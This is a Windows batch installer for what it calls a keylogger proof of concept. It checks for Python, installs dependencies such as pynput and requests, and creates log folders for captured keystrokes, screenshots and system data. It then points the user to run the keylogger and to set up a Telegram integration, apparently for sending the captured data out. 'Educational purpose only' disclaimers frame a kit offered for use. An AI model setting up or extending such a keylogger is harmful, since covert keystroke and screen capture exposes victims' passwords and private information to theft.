@echo off
REM Keylogger POC Installation Script for Windows
REM Educational Purpose Only - Use Responsibly

echo ========================================
echo Keylogger POC Installation Script
echo Educational Purpose Only
echo ========================================
echo.

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python is not installed or not in PATH
    echo Please install Python 3.8 or higher from https://python.org
    pause
    exit /b 1
)

echo Python found. Checking version...
python -c "import sys; exit(0 if sys.version_info >= (3, 8) else 1)"
if errorlevel 1 (
    echo ERROR: Python 3.8 or higher is required
    pause
    exit /b 1
)

echo Python version is compatible.
echo.

REM Check if pip is available
pip --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: pip is not available
    echo Please ensure pip is installed with Python
    pause
    exit /b 1
)

echo Installing Python dependencies...
pip install -r requirements.txt
if errorlevel 1 (
    echo ERROR: Failed to install dependencies
    pause
    exit /b 1
)

echo.
echo Dependencies installed successfully.
echo.

REM Create necessary directories
echo Creating directory structure...
if not exist "logs" mkdir logs
if not exist "logs\keystrokes" mkdir logs\keystrokes
if not exist "logs\screenshots" mkdir logs\screenshots
if not exist "logs\system" mkdir logs\system

echo Directory structure created.
echo.

REM Test the installation
echo Testing installation...
python -c "import pynput, cryptography, requests, PIL; print('All required modules imported successfully')"
if errorlevel 1 (
    echo WARNING: Some modules may not be properly installed
    echo The application may not work correctly
)

echo.
echo ========================================
echo Installation completed!
echo ========================================
echo.
echo To run the keylogger:
echo   python main.py
echo.
echo To configure Telegram integration:
echo   python scripts\setup_telegram.py
echo.
echo IMPORTANT REMINDERS:
echo - This is for educational purposes only
echo - Only use on systems you own or have permission to test
echo - Always inform users when deploying for testing
echo - Follow all applicable laws and regulations
echo.
pause

